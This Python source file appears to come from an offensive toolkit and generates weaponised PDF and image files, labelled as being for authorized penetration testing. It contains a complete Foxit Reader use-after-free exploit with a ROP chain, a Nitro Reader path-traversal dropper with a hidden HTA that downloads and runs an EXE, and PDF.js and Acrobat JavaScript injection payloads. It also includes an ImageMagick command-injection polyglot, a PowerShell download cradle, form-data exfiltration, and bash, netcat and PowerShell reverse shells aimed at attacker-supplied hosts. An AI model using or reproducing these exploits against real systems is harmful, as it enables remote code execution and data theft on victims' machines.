"""Staged / RCE-oriented PDF generators for authorized penetration testing."""

from __future__ import annotations

import base64
import os
import random
import re
import string
import struct
from pathlib import Path
from typing import Optional, Union

from lib.pdf.generators.viewer_cve import _CMBX12_FONT_B64  # noqa: SLF001

# Foxit Reader 9.0.1.1049 — WinExec cmdline must fit in 11 little-endian dwords.
FOXIT_UAF_WINEXEC_MAX = 44
FOXIT_UAF_SHARE_PATH_MAX = FOXIT_UAF_WINEXEC_MAX  # backwards-compatible alias


def build_foxit_uaf_winexec_arg(cmdline: str) -> str:
    """Null-pad a WinExec command line to a 4-byte boundary (max 44 bytes)."""
    cmd = cmdline if isinstance(cmdline, str) else cmdline.decode("latin-1")
    if not cmd:
        raise ValueError("WinExec command line is empty")
    pad = (4 - (len(cmd) % 4)) % 4
    padded = cmd + ("\x00" * pad)
    if len(padded) > FOXIT_UAF_WINEXEC_MAX:
        raise ValueError(
            f"WinExec argument is {len(padded)} bytes (max {FOXIT_UAF_WINEXEC_MAX}): "
            f"{cmd!r}. Shorten LHOST/SRVPORT/path or use delivery=smb with short names."
        )
    return padded


def build_foxit_uaf_share_path(
    lhost: str,
    share: str = "",
    exename: str = "",
) -> str:
    """Build a null-padded UNC path for CVE-2018-9948/9958 WinExec ROP."""
    host = (lhost or "").strip()
    if not host:
        raise ValueError("LHOST is required for the Foxit UAF UNC path")

    share_name = (share or "").strip() or random.choice(string.ascii_lowercase)
    fname = (exename or "").strip() or f"{random.choice(string.ascii_lowercase)}.exe"
    if not re.search(r"\.(exe|bat|cmd|hta)$", fname, re.I):
        fname = f"{fname}.exe"

    return build_foxit_uaf_winexec_arg(f"\\\\{host}\\{share_name}\\{fname}")


def build_foxit_uaf_mshta_arg(
    lhost: str,
    port: int,
    path: str = "h",
) -> str:
    """Build a short ``mshta http://LHOST[:PORT]/path`` WinExec argument."""
    host = (lhost or "").strip()
    if not host:
        raise ValueError("LHOST is required for HTTP delivery")
    slug = (path or "h").lstrip("/")
    port_i = int(port or 0)
    if port_i in (0, 80):
        url = f"mshta http://{host}/{slug}"
    else:
        url = f"mshta http://{host}:{port_i}/{slug}"
    return build_foxit_uaf_winexec_arg(url)


def build_hta_run_command(command: str) -> str:
    """HTA that runs ``command`` via WScript.Shell then closes."""
    escaped = (
        str(command)
        .replace("\\", "\\\\")
        .replace('"', '\\"')
        .replace("\r", "\\r")
        .replace("\n", "\\n")
    )
    return (
        '<html><head><script language="JScript">\n'
        "try {\n"
        '  var s = new ActiveXObject("WScript.Shell");\n'
        f'  s.Run("{escaped}", 0, false);\n'
        "} catch (e) {}\n"
        "try { window.close(); } catch (e2) {}\n"
        "</script></head><body></body></html>\n"
    )


def payload_to_command_string(payload: Union[str, bytes, None]) -> str:
    """Normalize a framework payload value to a Windows command string."""
    if payload is None:
        raise ValueError("No payload generated — set PAYLOAD and LHOST/LPORT first")
    if isinstance(payload, bytes):
        if payload.startswith(b"MZ"):
            raise ValueError(
                "Binary EXE payload selected — use delivery=smb and host the generated "
                "EXE, or choose a cmd/PowerShell payload for HTTP (mshta) delivery"
            )
        return payload.decode("utf-8", errors="ignore").strip()
    return str(payload).strip()


def _foxit_uaf_rop_share_assignments(share_path: str) -> str:
    raw = share_path.encode("latin-1")
    lines: list[str] = []
    max_index = 0
    for index in range(0, len(raw), 4):
        blk = struct.unpack_from("<I", raw, index)[0]
        dword_index = index // 4
        lines.append(f"        rop[0x{dword_index + 12:02x}] = 0x{blk:08x};")
        max_index = dword_index
    for i in range(max_index + 1, 11):
        lines.append(f"        rop[0x{i + 12:02x}] = 0x00000000;")
    return "\n".join(lines)


def create_foxit_reader_uaf_pdf(filename: Path | str, winexec_arg: str) -> None:
    """Write CVE-2018-9948/9958 Foxit Reader 9.0.1.1049 UAF PDF (WinExec cmdline)."""
    if len(winexec_arg.encode("latin-1")) > FOXIT_UAF_WINEXEC_MAX:
        raise ValueError("winexec_arg exceeds 44 bytes")

    rop = _foxit_uaf_rop_share_assignments(winexec_arg)
    path = Path(filename)
    path.write_text(
        f"""%PDF
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>>
2 0 obj
<</S /JavaScript /JS (

var heap_ptr   = 0;
var foxit_base = 0;
var pwn_array  = [];

function prepare_heap(size){{
    var arr = new Array(size);
    for(var i = 0; i < size; i++){{
        arr[i] = this.addAnnot({{type: "Text"}});;
        if (typeof arr[i] == "object"){{
            arr[i].destroy();
        }}
    }}
}}

function gc() {{
    const maxMallocBytes = 128 * 0x100000;
    for (var i = 0; i < 3; i++) {{
        var x = new ArrayBuffer(maxMallocBytes);
    }}
}}

function alloc_at_leak(){{
    for (var i = 0; i < 0x64; i++){{
        pwn_array[i] = new Int32Array(new ArrayBuffer(0x40));
    }}
}}

function control_memory(){{
    for (var i = 0; i < 0x64; i++){{
        for (var j = 0; j < pwn_array[i].length; j++){{
            pwn_array[i][j] = foxit_base + 0x01a7ee23; // push ecx; pop esp; pop ebp; ret 4
        }}
    }}
}}

function leak_vtable(){{
    var a = this.addAnnot({{type: "Text"}});

    a.destroy();
    gc();

    prepare_heap(0x400);
    var test = new ArrayBuffer(0x60);
    var stolen = new Int32Array(test);

    var leaked = stolen[0] & 0xffff0000;
    foxit_base = leaked - 0x01f50000;
}}

function leak_heap_chunk(){{
    var a = this.addAnnot({{type: "Text"}});
    a.destroy();
    prepare_heap(0x400);

    var test = new ArrayBuffer(0x60);
    var stolen = new Int32Array(test);

    alloc_at_leak();
    heap_ptr = stolen[1];
}}

function reclaim(){{
    var arr = new Array(0x10);
    for (var i = 0; i < arr.length; i++) {{
        arr[i] = new ArrayBuffer(0x60);
        var rop = new Int32Array(arr[i]);

        rop[0x00] = heap_ptr;                // pointer to our stack pivot from the TypedArray leak
        rop[0x01] = foxit_base + 0x01a11d09; // xor ebx,ebx; or [eax],eax; ret
        rop[0x02] = 0x72727272;              // junk
        rop[0x03] = foxit_base + 0x00001450  // pop ebp; ret
        rop[0x04] = 0xffffffff;              // ret of WinExec
        rop[0x05] = foxit_base + 0x0069a802; // pop eax; ret
        rop[0x06] = foxit_base + 0x01f2257c; // IAT WinExec
        rop[0x07] = foxit_base + 0x0000c6c0; // mov eax,[eax]; ret
        rop[0x08] = foxit_base + 0x00049d4e; // xchg esi,eax; ret
        rop[0x09] = foxit_base + 0x00025cd6; // pop edi; ret
        rop[0x0a] = foxit_base + 0x0041c6ca; // ret
        rop[0x0b] = foxit_base + 0x000254fc; // pushad; ret
{rop}
        rop[0x17] = 0x00000000;              // adios, amigo
    }}
}}

function trigger_uaf(){{
    var that = this;
    var a = this.addAnnot({{type:"Text", page: 0, name:"uaf"}});
    var arr = [1];
    Object.defineProperties(arr,{{
        "0":{{
            get: function () {{

                that.getAnnot(0, "uaf").destroy();

                reclaim();
                return 1;
            }}
        }}
    }});

    a.point = arr;
}}

function main(){{
    leak_heap_chunk();
    leak_vtable();
    control_memory();
    trigger_uaf();
}}

if (app.platform == "WIN"){{
    if (app.isFoxit == "Foxit Reader"){{
        if (app.appFoxitVersion == "9.0.1.1049"){{
            main();
        }}
    }}
}}

)>> trailer <</Root 1 0 R>>
""",
        encoding="latin-1",
    )


def _rand_alpha(n: int) -> str:
    return "".join(random.choice(string.ascii_letters) for _ in range(n))


def build_nitro_hidden_hta_header(app_name: str) -> str:
    """Hidden / off-screen HTA chrome (Brendan Coles style, as used by MSF)."""
    return (
        f"<head><hta:application\n"
        f'applicationname="{app_name}"\n'
        'border="none"\n'
        'borderstyle="normal"\n'
        'caption="false"\n'
        'contextmenu="false"\n'
        'icon="%SystemRoot%/Installer/{7E1360F1-8915-419A-B939-900B26F057F0}/Professional.ico"\n'
        'maximizebutton="false"\n'
        'minimizebutton="false"\n'
        'navigable="false"\n'
        'scroll="false"\n'
        'selection="false"\n'
        'showintaskbar="No"\n'
        'sysmenu="false"\n'
        'version="1.0"\n'
        'windowstate="Minimize"></head>\n'
        "<style>* { visibility: hidden; }</style>\n"
        '<script language="VBScript">\n'
        "window.resizeTo 1,1\n"
        "window.moveTo -2000,-2000\n"
        "</script>\n"
        '<script type="text/javascript">setTimeout("window.close()", 5000);</script>\n'
    )


def build_nitro_hta_download_exe(
    exe_url: str,
    *,
    payload_name: str,
    temp_folder: str = "/Windows/Temp",
) -> str:
    """HTA that downloads an EXE over HTTP and runs it (MSF nitro_reader_jsapi)."""
    name_xmlhttp = _rand_alpha(2)
    name_adodb = _rand_alpha(2)
    url = exe_url.strip()
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"
    exe_path = f"C:{temp_folder}/{payload_name}.exe"
    body = (
        f'{build_nitro_hidden_hta_header(payload_name)}'
        f'<script language="VBScript">\n'
        "On Error Resume Next\n"
        f'Set {name_xmlhttp} = CreateObject("Microsoft.XMLHTTP")\n'
        f'{name_xmlhttp}.open "GET","{url}",False\n'
        f"{name_xmlhttp}.send\n"
        f'Set {name_adodb} = CreateObject("ADODB.Stream")\n'
        f"{name_adodb}.Open\n"
        f"{name_adodb}.Type=1\n"
        f"{name_adodb}.Write {name_xmlhttp}.responseBody\n"
        f'{name_adodb}.SaveToFile "{exe_path}",2\n'
        'set shellobj = CreateObject("wscript.shell")\n'
        f'shellobj.Run "{exe_path}",0\n'
        "</script>"
    )
    return "".join(line.lstrip() for line in body.splitlines(True))


def build_nitro_hta_run_command(command: str, *, payload_name: str) -> str:
    """HTA that runs a cmd/PowerShell payload directly (no second-stage EXE)."""
    escaped = (
        str(command)
        .replace("\\", "\\\\")
        .replace('"', '\\"')
        .replace("\r", "")
        .replace("\n", " ")
    )
    body = (
        f"{build_nitro_hidden_hta_header(payload_name)}"
        '<script language="VBScript">\n'
        "On Error Resume Next\n"
        'set shellobj = CreateObject("wscript.shell")\n'
        f'shellobj.Run "{escaped}",0\n'
        "</script>"
    )
    return "".join(line.lstrip() for line in body.splitlines(True))


def create_nitro_reader_jsapi_pdf(
    filename: Path | str,
    hta_body: str,
    *,
    payload_name: str,
    temp_folder: str = "/Windows/Temp",
) -> None:
    """Write CVE-2017-7442 Nitro saveAs/launchURL PDF with embedded HTA stream."""
    # Traversal target written by this.saveAs / app.launchURL (c$: dialog bypass).
    drop_path = f"{temp_folder}/{payload_name}.hta"
    traversal = "../../../../../../../../../../../../../../../.." + drop_path
    launch = "c$:/../../../../../../../../../../../../../../../.." + drop_path

    hta = hta_body
    pdf = (
        "%PDF-1.7\n"
        "4 0 obj\n"
        "<<\n"
        "/Length 0\n"
        ">>\n"
        "stream\n"
        f"{hta}\n"
        "endstream endobj\n"
        "5 0 obj\n"
        "<<\n"
        "/Type /Page\n"
        "/Parent 2 0 R\n"
        "/Contents 4 0 R\n"
        ">>\n"
        "endobj\n"
        "1 0 obj\n"
        "<<\n"
        "/Type /Catalog\n"
        "/Pages 2 0 R\n"
        "/OpenAction [ 5 0 R /Fit ]\n"
        "/Names <<\n"
        "/JavaScript <<\n"
        "/Names [ (EmbeddedJS)\n"
        "<<\n"
        "/S /JavaScript\n"
        "/JS (\n"
        f"this.saveAs('{traversal}');\n"
        f"app.launchURL('{launch}');\n"
        ")\n"
        ">>\n"
        "]\n"
        ">>\n"
        ">>\n"
        ">>\n"
        "endobj\n"
        "2 0 obj\n"
        "<</Type/Pages/Count 1/Kids [ 5 0 R ]>>\n"
        "endobj\n"
        "3 0 obj\n"
        "<<>>\n"
        "endobj\n"
        "xref\n"
        "0 6\n"
        "0000000000 65535 f\n"
        "0000000166 00000 n\n"
        "0000000244 00000 n\n"
        "0000000305 00000 n\n"
        "0000000009 00000 n\n"
        "0000000058 00000 n\n"
        "trailer <<\n"
        "/Size 6\n"
        "/Root 1 0 R\n"
        ">>\n"
        "startxref\n"
        "327\n"
        "%%EOF\n"
    )
    Path(filename).write_text(pdf, encoding="latin-1", errors="surrogateescape")


def _escape_pdfjs_fontmatrix_js(js: str) -> str:
    """Escape JS for FontMatrix (CVE-2024-4367) injection context."""
    escaped = js.replace("\\", "\\\\").replace('"', '\\"')
    return f"1\\); {escaped}//"


def build_pdfjs_js(payload_mode: str, *, lhost: str, lport: int, stage_url: str) -> str:
    host = (lhost or "").strip()
    port = int(lport or 0)
    stage = stage_url.strip().rstrip("/")
    if not stage:
        raise ValueError("stage_url is required")

    if payload_mode == "callback":
        return f'fetch("{stage}/callback.pdfjs")'
    if payload_mode == "fetch_stager":
        return f'fetch("{stage}/stage.js").then(function(r){{return r.text()}}).then(function(c){{eval(c)}})'
    if payload_mode == "websocket_c2":
        ws = stage.replace("https://", "wss://").replace("http://", "ws://")
        if not ws.startswith(("ws://", "wss://")):
            ws = f"ws://{stage.lstrip('/')}/"
        return f'new WebSocket("{ws}")'
    if payload_mode == "reverse_shell_hint":
        return (
            f'fetch("{stage}/stage.js").then(function(r){{return r.text()}}).then(function(c){{eval(c)}})'
        )
    raise ValueError(f"Unknown PDF.js payload mode: {payload_mode}")


def build_stage_js_template(payload_mode: str, *, lhost: str, lport: int) -> str:
    """JavaScript served at STAGE_URL for PDF.js second-stage (authorized tests)."""
    host = (lhost or "").strip()
    port = int(lport or 0)
    c2 = f"http://{host}:{port}" if host and port else "/* set CALLBACK_URL */"
    if payload_mode in ("fetch_stager", "reverse_shell_hint"):
        return f"""// KittySploit PDF.js stage — authorized testing only
// Host this file at STAGE_URL/stage.js
(function() {{
  var C2 = "{c2}";
  fetch(C2 + "/stage-loaded?ctx=pdfjs");
}})();
"""
    if payload_mode == "websocket_c2":
        ws = f"ws://{host}:{port}/" if host and port else "ws://attacker:port/"
        return f"""// WebSocket stage endpoint expected at {ws}
"""
    return f'fetch("{c2}/callback");\n'


def create_pdfjs_fontmatrix_rce(filename: Path | str, js_payload: str) -> None:
    font_stream = base64.b64decode(_CMBX12_FONT_B64)
    injection = _escape_pdfjs_fontmatrix_js(js_payload)
    path = Path(filename)
    with path.open("wb") as file:
        file.write(b"%PDF-1.7\n\n")
        file.write(b"1 0 obj\n<< /Pages 2 0 R /Type /Catalog >>\nendobj\n\n")
        file.write(
            b"2 0 obj\n<< /Count 1 /Kids [3 0 R] /MediaBox [0 0 595 842] /Type /Pages >>\nendobj\n\n"
        )
        file.write(
            b"3 0 obj\n<< /Contents 4 0 R /Parent 2 0 R "
            b"/Resources << /Font << /F1 5 0 R >> >> /Type /Page >>\nendobj\n\n"
        )
        file.write(
            b"4 0 obj\n<< >>\nstream\nBT\n7 Tr\n10 20 TD\n/F1 20 Tf\n(F) Tj\nET\nendstream\nendobj\n\n"
        )
        file.write(b"5 0 obj\n<< /BaseFont /SNCSTG+CMBX12 /FontDescriptor 6 0 R")
        file.write(f' /FontMatrix [1 2 3 4 5 ({injection})]'.encode())
        file.write(b" /Subtype /Type1 /Type /Font >>\nendobj\n\n")
        file.write(
            b"6 0 obj\n<< /Flags 4 /FontBBox [-53 -251 1139 750] /FontFile 7 0 R "
            b"/FontName /SNCSTG+CMBX12 /ItalicAngle 0 /Type /FontDescriptor >>\nendobj\n\n"
        )
        file.write(b"7 0 obj\n<< /Filter /ASCII85Decode >>\nstream\n")
        file.write(font_stream)
        file.write(b"\nendstream\nendobj\n\n")
        file.write(b"trailer << /Root 1 0 R /Size 8 >>\n%%EOF\n")


def create_pdfjs_postscript_rce(filename: Path | str, js_payload: str) -> None:
    path = Path(filename)
    body = "{" + f" {js_payload} " + "}"
    with path.open("w", encoding="utf-8") as file:
        file.write(
            f"""%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
         /XObject << /Im0 6 0 R >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (CVE-2018-5158 staged) Tj
  ET
  /Im0 Do
endstream
endobj

5 0 obj
  << /FunctionType 4
     /Domain [0 1]
     /Range [0 1]
     /Length {len(body)}
  >>
stream
{body}
endstream
endobj

6 0 obj
  << /Type /XObject
     /Subtype /Image
     /Width 1
     /Height 1
     /BitsPerComponent 8
     /ColorSpace [/Separation /All /DeviceGray 5 0 R]
     /Length 1
  >>
stream

endstream
endobj

xref
0 7
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000510 00000 n
0000000640 00000 n
0000000800 00000 n
trailer
  << /Root 1 0 R
     /Size 7
  >>
startxref
1050
%%EOF
"""
    )


def build_shell_command(payload_mode: str, *, lhost: str, lport: int, custom_command: str = "") -> str:
    host = lhost.strip()
    port = int(lport)
    if payload_mode == "reverse_shell_bash":
        return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
    if payload_mode == "reverse_shell_nc":
        return f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
    if payload_mode == "curl_bash_stager":
        return f"curl -fsSL http://{host}:{port}/stager.sh|bash"
    if payload_mode == "custom_cmd":
        cmd = custom_command.strip()
        if not cmd:
            raise ValueError("CUSTOM_COMMAND is required for custom_cmd mode")
        return cmd
    raise ValueError(f"Unknown shell payload mode: {payload_mode}")


def create_imagemagick_polyglot_rce(filename: Path | str, command: str) -> None:
    """ImageMagick/GraphicsMagick MSL polyglot — server-side command execution."""
    path = Path(filename)
    basename = path.name
    safe_cmd = command.replace("`", "\\`")
    with path.open("w", encoding="utf-8") as file:
        file.write(
            f"""<image authenticate='ff" `{safe_cmd}`;"'>
  <read filename="pdf:/etc/passwd"/>
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="msl:{basename}" height="100" width="100"/>
  </svg>
</image>
"""
        )


def _escape_acrobat_js_string(js: str) -> str:
    return js.replace("\\", "\\\\").replace("'", "\\'")


def build_acrobat_js_reverse_shell(payload_cmd: str) -> str:
    """Embed a framework-generated shell command in Acrobat OpenAction JS."""
    cmd = payload_cmd.strip()
    if not cmd:
        raise ValueError("Payload command is empty")
    inner = cmd.replace("\\", "\\\\").replace('"', '\\"')
    return f'app.launchURL("cmd /c start /min {inner}", true);'


def build_acrobat_js(payload_mode: str, *, lhost: str, lport: int, stage_url: str) -> str:
    host = lhost.strip()
    port = int(lport)
    stage = stage_url.strip() or f"http://{host}:{port}/stage.hta"

    if payload_mode == "callback":
        return f'app.launchURL("{stage}/callback", true);'
    if payload_mode == "launch_stager":
        return f'app.launchURL("{stage}", true);'
    if payload_mode == "powershell_cradle":
        ps = (
            f"powershell -w hidden -nop -c "
            f"\"IEX(New-Object Net.WebClient).DownloadString('http://{host}:{port}/stage.ps1')\""
        )
        return f'app.launchURL("cmd /c start /min {ps}", true);'
    if payload_mode == "submitform_exfil":
        return f'this.submitForm({{cURL: "http://{host}:{port}/exfil", cSubmitAs: "PDF"}});'
    raise ValueError(f"Unknown Acrobat payload mode: {payload_mode}")


def create_acrobat_openaction_rce(filename: Path | str, js_code: str) -> None:
    escaped = _escape_acrobat_js_string(js_code)
    path = Path(filename)
    with path.open("w", encoding="utf-8") as file:
        file.write(
            f"""%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      eval(
          '{escaped}';
      )
      >>
  >>
>>"""
        )


def build_stage_ps1_template(lhost: str, lport: int) -> str:
    return f"""# KittySploit Acrobat stage — authorized testing only
# Host at http://{lhost}:{lport}/stage.ps1
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
"""


def build_stage_sh_template(lhost: str, lport: int) -> str:
    return f"""#!/bin/bash
# KittySploit ImageMagick stager — authorized testing only
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
"""


def write_listener_notes(
    output_dir: Path,
    *,
    title: str,
    stage_url: str,
    payload_mode: str,
    lhost: str = "",
    lport: int = 0,
    extra: Optional[list[str]] = None,
) -> Path:
    notes = output_dir / "DELIVERY_NOTES.txt"
    lines = [
        f"# {title}",
        "# Authorized penetration testing only.",
        "",
        f"PAYLOAD_MODE={payload_mode}",
        f"STAGE_URL={stage_url}",
        "",
    ]
    if lhost and lport:
        lines.extend(
            [
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "",
                "Suggested listener (KittySploit):",
                "  use listeners/multi/reverse_tcp",
                f"  set LHOST {lhost}",
                f"  set LPORT {lport}",
                "  run",
                "",
                "Or netcat:",
                f"  nc -lvnp {lport}",
                "",
            ]
        )
    if extra:
        lines.extend(extra)
    notes.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return notes
